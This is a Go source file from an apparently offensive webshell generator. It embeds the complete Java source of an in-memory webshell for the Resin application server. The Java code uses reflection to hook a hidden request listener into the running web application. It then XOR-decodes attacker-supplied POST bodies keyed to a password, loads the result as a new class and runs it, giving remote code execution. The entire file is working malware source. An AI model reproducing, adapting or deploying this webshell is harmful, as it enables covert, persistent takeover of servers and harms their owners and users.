package BeResin

import "webshell/common"

func BeRxor() {
	common.Filename = "ResinListener.java"
	common.Webshells = `import java.lang.reflect.*;
import java.util.*;

public class ResinListener implements InvocationHandler {
    private static String password = "` + common.Password + `";

    private static Object lock = new Object();

    private Field getField(Object obj, String fieldName) {
        Class clazz;
        Field field = null;
        if (obj == null) {
            return null;
        }
        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field != null) {
            try {
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setAccessible(true);
            } catch (Exception e) {}
        }
        return field;
    }

    private Object getFieldValue(Object obj, String fieldName) {
        Field field;
        if (obj instanceof Field) {
            field = (Field) obj;
        } else {
            field = getField(obj, fieldName);
        }
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        }
    }

    private Method getMethodX(Class clazz, String methodName, int num) {
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {
            if (method.getName().equals(methodName)) {
                if (method.getParameterTypes().length == num) {
                    return method;
                }
            }
        }
        return null;
    }

    private Method getMethod(Class clazz, String methodName, Class... args) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {
        ArrayList clazzs = new ArrayList();
        if (args != null) {
            for (int i=0; i<args.length; i++) {
                Object arg = args[i];
                if (arg != null) {
                    clazzs.add(arg.getClass());
                } else {
                    clazzs.add(null);
                }
            }
        }
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{})
        );
        try {
            method.setAccessible(true);
            return method.invoke(obj, args);
        } catch (Exception e) {
            return null;
        }
    }

    private ClassLoader getLoader() {
        return Thread.currentThread().getContextClassLoader();
    }

    private byte[] b64decode(String payload) {
        Class base64;
        byte[] bytes = null;
        try {
            base64 = Class.forName("java.util.Base64");
            bytes = (byte[]) invokeMethod(
                getMethod(base64, "getDecoder").invoke(base64),
                "decode", payload
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                bytes = (byte[]) invokeMethod(
                    base64.newInstance(), "decodeBuffer", payload
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return bytes;
    }


    private Object getWebApp() throws Exception {
        Class servletInvocation = Class.forName(
            "com.caucho.server.dispatch.ServletInvocation"
        );
        Object contextRequest = getMethod(
            servletInvocation, "getContextRequest"
        ).invoke(servletInvocation);
        return getMethod(contextRequest.getClass(), "getWebApp")
            .invoke(contextRequest);
    }


    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            byte[] result = new byte[payload.length];
            for (int i = 0; i < result.length; i++) {
                result[i] = (byte) (payload[i] ^ key[i + 1 & 15]);
            }
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "XOR",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }


    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (invokeMethod(request, "getMethod").equals("POST")) {
            payload = (String) invokeMethod(
                    invokeMethod(request, "getReader"),"readLine"
            );
            java.util.HashMap pageContext = new java.util.HashMap();
            Object session = invokeMethod(request, "getSession");
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            invokeMethod(session, "putValue",
                'u', hasher(password, "MD5").substring(0, 16));
            byte[] b = decoder(payload);
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            ((Class) defineMethod.invoke(classloader, b, 0, b.length))
                .newInstance().equals(pageContext);
        }
        return null;
    }

    private void hook(Object servletRequestEvent) throws Exception {
        Object servletRequest = invokeMethod(
            servletRequestEvent, "getServletRequest"
        );
        Object servletResponse = invokeMethod(servletRequest, "getResponse");
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, servletRequest, servletResponse);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }
        return null;
    }

    private void addListener(Object proxyObject) throws Exception {
        Object webApp = getWebApp();
        ArrayList<?> listeners =
            (ArrayList<?>) getFieldValue(webApp, "_requestListeners");
        for (Object listener: listeners) {
            if (listener instanceof Proxy) {
                return;
            }
        }
        Class WebApp = webApp.getClass();
        if (WebApp.getName() == "com.caucho.server.webapp.Application") {
            WebApp = WebApp.getSuperclass();
        }
        Method addListenerObject = getMethodX(
            WebApp, "addListenerObject", 2
        );
        addListenerObject.setAccessible(true);
        addListenerObject.invoke(webApp, proxyObject, true);
    }

    public ResinListener() {
        synchronized(lock) {
            Class servletRequestListener = null;
            try {
                servletRequestListener = Class.forName(
                    "javax.servlet.ServletRequestListener"
                );
            } catch (ClassNotFoundException e) {}

            if (servletRequestListener != null) {
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{servletRequestListener}, this
                );
                try {
                    addListener(proxyObject);
                } catch (Exception e) {}
            }
        }
    }

    static {
        new ResinListener();
    }
}
`
}
